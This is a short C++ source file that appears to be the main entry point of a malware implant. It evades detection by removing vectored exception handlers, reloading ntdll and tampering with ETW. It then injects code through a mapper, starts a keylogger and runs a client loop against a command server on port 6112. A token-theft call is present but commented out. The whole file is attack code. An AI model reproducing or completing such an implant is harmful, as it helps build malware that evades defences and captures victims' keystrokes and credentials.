#include <iostream>
#include "MyClient.hpp"
#include <PNet/Communication.hpp>
#include "Evasion.hpp"
#include "Escalation.hpp"
#include "Mapper.hpp"
#include "klg.hpp"


extern Mapper* map;
extern TokenThief* tokenThief;

int main() {

	std::shared_ptr<Util> ut = std::make_shared<Util>();
	std::shared_ptr<ETWC3> et = std::make_shared<ETWC3>(ut);
	std::shared_ptr<VEHDumper> ve = std::make_shared<VEHDumper>(ut);

	
	ve->GetProcessCookie();
	ve->DumpVEH();
	ve->RemoveAllVEHs();
	ve->ReloadNtDll();
	
	//tokenThief->TokenSession();
	map->Inject(2);

	kl::klgstart();

	if (Network::Initialize()) {
		et->RetETW(); //creates some issues with ntdll at CreateProcess
		std::shared_ptr<MyClient> client = std::shared_ptr<MyClient>(new MyClient);
		client->pMyClient = client;
		if (client->Connect(IPEndpoint("127.0.0.1", 6112))) {
			while (client->IsConnected()) {
				client->Frame();
			}
		}
	}
	Network::ShutDown();
	system("pause");
	return 0;
}

